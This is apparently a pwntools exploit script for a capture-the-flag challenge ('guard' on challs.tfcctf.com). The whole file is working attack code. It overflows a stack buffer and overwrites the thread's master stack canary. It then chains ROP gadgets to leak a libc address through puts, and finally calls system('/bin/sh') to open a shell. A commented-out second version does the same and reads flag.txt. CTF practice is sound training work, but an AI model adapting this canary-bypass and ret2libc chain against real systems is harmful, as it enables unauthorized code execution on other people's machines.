#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template guard_patched --libc libc.so.6 --host challs.tfcctf.com --port 31470
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'guard_patched')

context.terminal = ['kitty']
if args.DBG:
    context.log_level = 'debug'

# ./exploit.py DBG - context.log_level = 'debug'
# ./exploit.py NOASLR - turn off aslr
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'challs.tfcctf.com'
port = int(args.PORT or 31470)

# Use the specified remote libc version unless explicitly told to use the
# local system version with the `LOLIB` argument.
# ./exploit.py LOCAL LOLIB
if args.LOLIB:
    libc = exe.libc
elif args.LOCAL:
    library_path = libcdb.download_libraries('libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('libc.so.6')
else:
    libc = ELF('libc.so.6')

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    p = connect(host, port)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# MACROS
def s(a) : return p.send(a)
def sl(a) : return p.sendline(a)
def sa(a,b) : return p.sendafter(a,b)
def sla(a,b) : return p.sendlineafter(a,b)
def rv(a) : return p.recv(a)
def ru(a) : return p.recvuntil(a)
def ra() : return p.recvall()
def rl() : return p.recvline()
def cyc(a): return cyclic(a)
def inr() : return p.interactive()
def rrw(var, list) : [var.raw(i) for i in list]
def rfg(var,a) : return var.find_gadget(a)
def rch(var) : return var.chain()
def rdm(var) : return var.dump()
def cls() : return p.close()

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
b game
continue
'''.format(**locals())


'''
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
                        BEGIN EXPLOIT
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>><<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
'''
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fc000)
# RUNPATH:  b'.'

p = start()

sla(b'Press 1',b'1')
sla(b'len:',b'3000')

rop = ROP(exe)
payl = [cyc(40), 0xdeadbeef, p64(0), rfg(rop,["pop rdi"]), exe.got["puts"], exe.plt["puts"], exe.sym["game"], cyc(0x7d8), 0x4040c0, cyc(0x10), 0xdeadbeef]
rrw(rop,payl)
payload = rop.chain()
debug(rop.dump())

sl(payload)

rv(1);libc.address = u64(rv(6).ljust(8,b'\0')) - 0x58e50 - 0x28000

rop = ROP(libc)
payl = [cyc(40), 0xdeadbeef, 0, rfg(rop,["ret"])]
rrw(rop,payl)
rop.system(b'/bin/sh\0')
payload = rop.chain()

info(f"ASLR: {hex(libc.address)}")

sl(payload)

# io = start()

# libc = ELF("libc.so.6")
# rop = ROP(exe)

# canary = master_canary = b"abcdefgh"
# rop.raw(b"a" * 40) # fill the buffer
# rop.raw(canary) # write the canary
# rop.raw(b"b" * 8) # fill rbp
# rop.puts(exe.got["puts"]) # leak puts address
# rop.raw(exe.symbols["game"]) # go back to game function again
# rop.raw(b"c" * (2096 - len(rop.chain()))) # TLS padding
# rop.raw(pack(0x3fe000)) # valid write address
# rop.raw("d" * 16) # fs_base padding
# rop.raw(master_canary) # overwrite the master canary

# io.sendlineafter(b".\n", b"1")
# io.sendlineafter(b": ", str(len(rop.chain())).encode())
# io.sendline(rop.chain()) # send the payload

# puts = unpack(io.recvline().strip().ljust(8, b"\x00")) # receive the leaked puts address
# libc.address = puts - libc.symbols["puts"] # calculate libc base address

# rop = ROP(libc)
# rop.raw(b"e" * 40) # fill the buffer
# rop.raw(canary) # write the same canary
# rop.raw(b"f" * 8) # fill rbp
# rop.raw(pack(0x401464)) # stack alignment; ret
# rop.system(next(libc.search(b"/bin/sh\x00"))) # call system("/bin/sh")
# io.sendline(rop.chain()) # send the payload

# io.interactive()

# sl(b"echo '$$'")
# sl(b'cat flag.txt')
# ru(b'$$\n')
# flag = rl().decode()
# log.success(f"FLAG: {flag}")

inr()

